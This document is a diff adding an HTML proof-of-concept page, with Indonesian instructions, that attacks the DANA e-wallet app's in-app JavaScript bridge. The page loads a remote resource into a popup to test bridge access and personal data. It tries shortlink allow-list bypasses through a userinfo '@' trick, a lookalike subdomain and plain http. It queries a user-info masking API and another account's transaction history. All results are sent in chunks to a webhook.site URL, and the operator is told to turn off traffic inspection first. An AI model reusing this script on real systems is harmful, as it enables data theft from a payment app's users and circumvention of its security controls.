@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DANA H5 Bridge Test v14</title>
+<style>
+  body{font-family:monospace;background:#111;color:#0f0;padding:12px;font-size:12px;margin:0;padding-top:24px}
+  h3{color:#ff0;margin:14px 0 4px;font-size:13px}
+  .ok{color:#0f0}.err{color:#f55}.pending{color:#888}
+  pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:8px;border:1px solid #333;margin:4px 0;max-height:220px;overflow:auto}
+  button{background:#050;color:#0f0;border:1px solid #0f0;padding:14px;margin:8px 0;font-size:15px;width:100%;font-weight:bold}
+  button.mini{width:auto;padding:6px 10px;font-size:11px;background:#220;color:#ff0;border:1px solid #660;font-weight:normal}
+  button:disabled{background:#222;color:#666;border-color:#444}
+  #status{position:fixed;top:0;left:0;right:0;background:#330;color:#ff0;padding:5px;font-size:11px;z-index:9}
+  .note{color:#0ff;margin:4px 0}
+  .warn{color:#f80;margin:4px 0}
+  input,textarea{width:96%;background:#000;color:#0ff;border:1px solid #660;padding:8px;font-size:12px;margin:2px 0 8px 0;font-family:monospace}
+  textarea{min-height:70px}
+</style>
+</head>
+<body>
+<div id="status">v14 boot...</div>
+<h3 style="color:#0ff">v14 - WEB-SHELL VERDICT (AUTO OOB) + SHORTLINK WHITELIST BYPASS</h3>
+<p class="warn">DISCONNECT HTTP Toolkit dulu, baru tap RUN. Popup kebuka sendiri di tengah run - JANGAN ditutup. Semua hasil terkirim otomatis ke kanal luar - paste balik cuma cadangan.</p>
+
+<h3>[0] env</h3><pre id="p-0" class="pending">pending</pre>
+
+<p class="note">INPUT 1 - partnerId (sudah diisi default, boleh diubah):</p>
+<input id="inp-pids" value="2166020242494729">
+<p class="note">INPUT 2 (opsional) - userId akun DANA kedua MILIKMU:</p>
+<input id="inp-uid2" placeholder="216610000xxxxxxxxxx">
+
+<button id="btn2" onclick="runPhase2()">&#9654; RUN PHASE 2 (Toolkit OFF dulu)</button>
+
+<h3>[1] netcheck</h3><pre id="p-1" class="pending">pending</pre>
+<h3>[2] downloadFile resource-v14 + fetch</h3><pre id="p-2" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-2')">copy</button>
+<h3>[3] POPUP AUTO-VERDICT (ping balik + OOB - tunggu ~28 dtk)</h3><pre id="p-3" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-3')">copy</button>
+<h3>[4] shortlink BYPASS @ userinfo (m.dana.id@httpbin.org)</h3><pre id="p-4" class="pending">pending</pre>
+<h3>[5] shortlink BYPASS suffix (m.dana.id.httpbin.org)</h3><pre id="p-5" class="pending">pending</pre>
+<h3>[6] shortlink BYPASS http:// scheme</h3><pre id="p-6" class="pending">pending</pre>
+<h3>[7] shortlink CONTROL m.dana.id (DI AKHIR)</h3><pre id="p-7" class="pending">pending</pre><button class="mini" onclick="copyBlock('p-7')">copy</button>
+<h3>[8] masking x pids</h3><pre id="p-8" class="pending">pending</pre>
+<h3>[9] trx family [uid2]</h3><pre id="p-9" class="pending">pending</pre>
+
+<button onclick="copyAll()">COPY ALL RESULTS (compact)</button>
+<button class="mini" onclick="exfilManual()" style="width:100%;padding:10px">[17] KIRIM ULANG HASIL KE KANAL LUAR (webhook)</button>
+<button class="mini" onclick="openPopupAgain()" style="width:100%;padding:10px">[18] BUKA POPUP LAGI (baca tulisan besar BRIDGE: ADA/TIDAK)</button>
+<button class="mini" onclick="openShortlinkCtl()" style="width:100%;padding:10px">[19] BUKA SHORTLINK CONTROL hasil mint - catat muncul apa</button>
+<button class="mini" onclick="openShortlinkAt()" style="width:100%;padding:10px">[20] BUKA SHORTLINK @-TRICK kalau [4] sukses - catat muncul apa</button>
+<button class="mini" onclick="navData()" style="width:100%;padding:10px">[21] OPTIONAL SETELAH COPY: location = data:text/html (render? hitam? - BACK lalu laporkan)</button>
+
+<script>
+(function(){
+  var RESULTS = {};
+  var LOG = [];
+  var running = false;
+  var attempt = 0;
+  var OP_MASKING = 'id.dana.minitunnel.user.info.masking';
+  var PAGES = 'https://rfypych.github.io/poc';
+  var WH = 'https://webhook.site/ae24b403-f298-4923-8e42-5cb1ba6cbd50';
+  var lastAp = null;
+  var lastApText = null;
+  var lastShortCtl = null;
+  var lastShortAt = null;
+  var blobUrl = null;
+
+  function compact(o){
+    try { return typeof o === 'string' ? o : JSON.stringify(o); } catch(e) { return String(o); }
+  }
+  function set(id, obj, cls){
+    var el = document.getElementById(id);
+    el.className = cls || 'ok';
+    var txt;
+    try { txt = (typeof obj === 'string') ? obj : JSON.stringify(obj, null, 1); } catch(e) { txt = String(obj); }
+    if (txt && txt.length > 1800) txt = txt.slice(0,1800) + '...TRUNC';
+    el.textContent = txt;
+    RESULTS[id] = obj;
+  }
+  var statusEl = document.getElementById('status');
+  function status(t){ statusEl.textContent = t; }
+
+  function bridgeReady(cb){
+    if (window.AlipayJSBridge) return cb();
+    var fired = false;
+    var go = function(){ if (!fired){ fired = true; cb(); } };
+    document.addEventListener('AlipayJSBridgeReady', go, false);
+    setTimeout(go, 5000);
+  }
+  function call(api, param, timeoutMs){
+    return new Promise(function(resolve){
+      var done = false;
+      var t = setTimeout(function(){ if(!done){ done = true; resolve({__timeout:true, waitedMs:timeoutMs||15000}); } }, timeoutMs || 15000);
+      try {
+        window.AlipayJSBridge.call(api, param || {}, function(r){
+          if (!done) { done = true; clearTimeout(t); resolve(r); }
+        });
+      } catch(e) {
+        if (!done) { done = true; clearTimeout(t); resolve({__exception:String(e)}); }
+      }
+    });
+  }
+  function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
+  function getPids(){
+    var raw = (document.getElementById('inp-pids').value || '').trim();
+    if (!raw) return [];
+    return raw.split(/[\s,;]+/).filter(Boolean).slice(0,3);
+  }
+  function getUid2(){
+    return (document.getElementById('inp-uid2').value || '').trim();
+  }
+  function blobOf(){
+    if (blobUrl) return blobUrl;
+    if (!lastApText) return null;
+    try { blobUrl = URL.createObjectURL(new Blob([lastApText], {type:'text/html'})); } catch(e){ return null; }
+    return blobUrl;
+  }
+  function dataUrl(){
+    if (!lastApText) return null;
+    try { return 'data:text/html;base64,' + btoa(unescape(encodeURIComponent(lastApText))); } catch(e){ return null; }
+  }
+  function whPing(params){
+    try {
+      var q = [];
+      for (var k in params) q.push(k + '=' + encodeURIComponent(String(params[k]).slice(0,400)));
+      return fetch(WH + '?' + q.join('&'), {mode:'no-cors', cache:'no-store'}).catch(function(e){});
+    } catch(e){ return Promise.resolve(); }
+  }
+
+  window.copyBlock = function(id){
+    var ta = document.createElement('textarea');
+    ta.value = id + ': ' + compact(RESULTS[id]);
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); status('copied ' + id); } catch(e) { status('copy failed'); }
+    document.body.removeChild(ta);
+  };
+  function buildReport(){
+    var lines = [];
+    lines.push('v14 @ ' + location.href.slice(0,110));
+    lines.push('log: ' + compact(LOG));
+    lines.push('inputs: ' + compact({pids:getPids(), uid2:getUid2()}));
+    for (var k = 1; k <= 9; k++) {
+      var id = 'p-' + k;
+      if (RESULTS[id] !== undefined) {
+        var s = compact(RESULTS[id]);
+        if (s.length > 900) s = s.slice(0,900) + '...CUT';
+        lines.push(id + ': ' + s);
+      }
+    }
+    return lines.join('\n');
+  }
+  window.copyAll = function(){
+    var ta = document.createElement('textarea');
+    ta.value = buildReport();
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); status('copied - paste it back'); } catch(e) { status('copy failed - screenshot'); }
+    document.body.removeChild(ta);
+  };
+  async function exfilReport(tag){
+    var txt = (tag ? tag + '\n' : '') + buildReport();
+    var n = Math.ceil(txt.length / 380);
+    if (n > 12) n = 12;
+    var sent = 0;
+    for (var c = 0; c < n; c++){
+      await whPing({src:'v14main', i:c, n:n, d:txt.slice(c*380, (c+1)*380)});
+      sent++;
+      await sleep(300);
+    }
+    return {chunksSent:sent, totalLen:txt.length};
+  }
+  window.exfilManual = async function(){
+    status('kirim ke kanal luar...');
+    var r = await exfilReport('manual');
+    status('terkirim ' + r.chunksSent + ' chunk - cek ulang oleh operator');
+  };
+
+  function netcheck(){
+    var t0 = Date.now();
+    var rel = fetch('ping.txt?cb=' + Date.now(), {cache:'no-store'})
+      .then(function(r){ return {ok:true, http:r.status, ms:Date.now()-t0}; })
+      .catch(function(e){ return {ok:false, err:String(e).slice(0,60), ms:Date.now()-t0}; });
+    var abs = fetch(PAGES + '/ping.txt?cb=' + Date.now(), {mode:'no-cors', cache:'no-store'})
+      .then(function(){ return {noCors:true, ok:true}; })
+      .catch(function(e){ return {noCors:true, ok:false, err:String(e).slice(0,60)}; });
+    return Promise.all([rel, abs]).then(function(a){ return {relative:a[0], absoluteNoCors:a[1]}; });
+  }
+
+  window.openPopupAgain = function(){
+    var u = blobOf();
+    if (!u) { alert('belum ada teks resource dari [2] - jalankan phase 2 dulu'); return; }
+    var w = null;
+    try { w = window.open(u, '_blank'); } catch(e){}
+    status(w ? 'popup dibuka - baca tulisan besarnya' : 'popup gagal dibuka');
+  };
+  window.openShortlinkCtl = function(){
+    if (!lastShortCtl) { alert('belum ada shortUrl CONTROL sukses dari [7]'); return; }
+    location.href = lastShortCtl;
+  };
+  window.openShortlinkAt = function(){
+    if (!lastShortAt) { alert('[4] belum sukses mint shortlink @-trick'); return; }
+    location.href = lastShortAt;
+  };
+  window.navData = function(){
+    var u = dataUrl();
+    if (!u) { alert('belum ada teks resource dari [2]'); return; }
+    location.href = u;
+  };
+
+  async function popupCapture(){
+    if (!blobOf()) return {skipped:'no blob (butuh teks resource [2])'};
+    var msgs = [];
+    var gotFinal = false;
+    var listener = function(e){
+      try {
+        if (e && e.data && e.data.__v14popup){
+          msgs.push({origin:String(e.origin), stage:e.data.stage, head:compact(e.data.data).slice(0,300)});
+          if (e.data.stage === 'final') gotFinal = true;
+        }
+      } catch(err){}
+    };
+    window.addEventListener('message', listener, false);
+    var w = null;
+    try { w = window.open(blobOf(), '_blank'); } catch(e){}
+    var t0 = Date.now();
+    var pings = 0;
+    while ((Date.now() - t0) < 28000 && !gotFinal){
+      try { if (w) w.postMessage({__v14ping:true, n:++pings}, '*'); } catch(e){}
+      await sleep(800);
+    }
+    window.removeEventListener('message', listener, false);
+    var out = {opened:!!w, pingSent:pings, waitedMs:Date.now()-t0, msgs:(msgs.length ? msgs : null)};
+    var derived = null;
+    for (var i = 0; i < msgs.length; i++){
+      var h = msgs[i].head || '';
+      if (h.indexOf('"hasBridge":true') !== -1) derived = 'BRIDGE-YES';
+      if (h.indexOf('"hasBridge":false') !== -1) derived = 'BRIDGE-NO';
+    }
+    for (var j = 0; j < msgs.length; j++){
+      var hj = msgs[j].head || '';
+      if (msgs[j].stage === 'pii' && hj.indexOf('"piiBytes":0') === -1 && derived !== 'BRIDGE-NO') derived = (derived || '') + '+PII';
+    }
+    out.derived = derived;
+    try { out.popupClosed = !!(w && w.closed); } catch(e){}
+    out.note = derived ? ('VERDICT: ' + derived + ' (kanal ping balik jalan - cek juga webhook utk data lengkap)') : 'tidak ada pesan balik - lihat layar popup / webhook / tombol COPY di popup';
+    return out;
+  }
+
+  window.runPhase2 = async function(){
+    if (running) return;
+    if (!window.AlipayJSBridge) { status('no bridge - cannot run phase 2'); return; }
+    running = true; attempt++;
+    var btn = document.getElementById('btn2');
+    btn.disabled = true;
+    var pids = getPids();
+    var uid2 = getUid2();
+    LOG.push({attempt:attempt, startedAt:new Date().toISOString(), pids:pids, uid2:uid2?'set':'empty'});
+    try {
+      status('P2/' + attempt + ' [1] netcheck');
+      set('p-1', await netcheck());
+
+      status('P2/' + attempt + ' [2] downloadFile resource-v14 + fetch');
+      var dl = await call('downloadFile', {url:PAGES + '/resource-v14.html', filePath:'v14res.html', downloadTaskId:14}, 25000);
+      var f = {noApPath:true};
+      var ap = dl && (dl.apFilePath || dl.filePath);
+      if (ap && typeof ap === 'string'){
+        lastAp = ap;
+        try {
+          var r = await fetch(ap, {cache:'no-store'});
+          var tx = await r.text();
+          lastApText = tx;
+          f = {fetched:true, http:r.status, contentType:(r.headers && r.headers.get) ? r.headers.get('content-type') : '?', bytes:tx.length, apFilePath:ap};
+        } catch(e){ f = {fetched:false, err:String(e).slice(0,80), apFilePath:ap}; }
+      }
+      if (!lastApText){
+        try {
+          var r2 = await fetch(PAGES + '/resource-v14.html', {cache:'no-store'});
+          var tx2 = await r2.text();
+          lastApText = tx2;
+          f.githubFallback = {http:r2.status, bytes:tx2.length};
+        } catch(e){ f.githubFallback = {err:String(e).slice(0,60)}; }
+      }
+      set('p-2', {call:dl, fetchAp:f});
+      await sleep(800);
+
+      status('P2/' + attempt + ' [3] POPUP AUTO-VERDICT - tunggu, JANGAN tutup popup');
+      set('p-3', await popupCapture());
+      await sleep(800);
+
+      status('P2/' + attempt + ' [4] shortlink BYPASS @ userinfo');
+      var s1 = await call('createShortLink', {url:'https://m.dana.id@httpbin.org/anything?src=v14at'}, 20000);
+      set('p-4', s1);
+      if (s1 && s1.shortUrl) lastShortAt = s1.shortUrl;
+      await sleep(3000);
+
+      status('P2/' + attempt + ' [5] shortlink BYPASS suffix subdomain');
+      var s2 = await call('createShortLink', {url:'https://m.dana.id.httpbin.org/poc'}, 20000);
+      set('p-5', s2);
+      await sleep(3000);
+
+      status('P2/' + attempt + ' [6] shortlink BYPASS http scheme');
+      var s3 = await call('createShortLink', {url:'http://m.dana.id/v14http'}, 20000);
+      set('p-6', s3);
+      await sleep(3000);
+
+      status('P2/' + attempt + ' [7] shortlink CONTROL m.dana.id (DI AKHIR)');
+      var s4 = await call('createShortLink', {url:'https://m.dana.id/v14ctl/path?poc=14&x=2'}, 20000);
+      set('p-7', s4);
+      if (s4 && s4.shortUrl) lastShortCtl = s4.shortUrl;
+      await sleep(800);
+
+      status('P2/' + attempt + ' [8] masking x pids');
+      if (pids.length){
+        var mres = {};
+        for (var i = 0; i < pids.length; i++){
+          mres[pids[i]] = await call('requestApi', {operationType:OP_MASKING, payload:{partnerId:pids[i]}}, 20000);
+          await sleep(600);
+        }
+        set('p-8', mres);
+      } else {
+        set('p-8', 'skipped - no partnerId input', 'err');
+      }
+
+      status('P2/' + attempt + ' [9] trx family [uid2]');
+      if (uid2){
+        set('p-9', await call('getTransactionHistoryList', {event:'getInitList', pageNum:1, forceCache:false, familyAccountMemberIds:[uid2]}, 25000));
+      } else {
+        set('p-9', 'skipped - no second-account userId input', 'err');
+      }
+
+      LOG.push({attempt:attempt, finishedAt:new Date().toISOString(), note:'phase2 complete', lastAp:lastAp, lastShortCtl:lastShortCtl, lastShortAt:lastShortAt, resTextBytes:lastApText?lastApText.length:0});
+      status('DONE P2 attempt ' + attempt + ' - kirim OOB, lalu COPY ALL');
+      var ex = await exfilReport('auto-phase2');
+      LOG.push({oob:{chunksSent:ex.chunksSent}});
+      status('DONE - OOB terkirim (' + ex.chunksSent + ' chunk). COPY ALL sbg cadangan, lalu optional [18]-[21]');
+    } catch(e) {
+      status('phase2 error: ' + String(e).slice(0,60));
+    }
+    running = false;
+    btn.disabled = false;
+    btn.innerHTML = '&#8635; RE-RUN PHASE 2';
+  };
+
+  bridgeReady(function(){
+    if (!window.AlipayJSBridge){
+      set('p-0', {noBridge:true, href:location.href, ua:navigator.userAgent.slice(0,80)}, 'err');
+      status('NO BRIDGE (browser?) - open inside DANA container');
+      return;
+    }
+    var sp = {};
+    try { sp = window.AlipayJSBridge.startupParams || {}; } catch(e){}
+    set('p-0', {hasBridge:true, appId:sp.appId, startScene:sp.startScene||sp.scene, href:location.href.slice(0,100)});
+    LOG.push({phase1Done:new Date().toISOString()});
+    whPing({src:'v14boot', href:location.href.slice(0,100), appId:sp.appId});
+    status('PHASE 1 DONE - disconnect toolkit, RUN PHASE 2');
+  });
+})();
+</script>
+</body>
+</html>
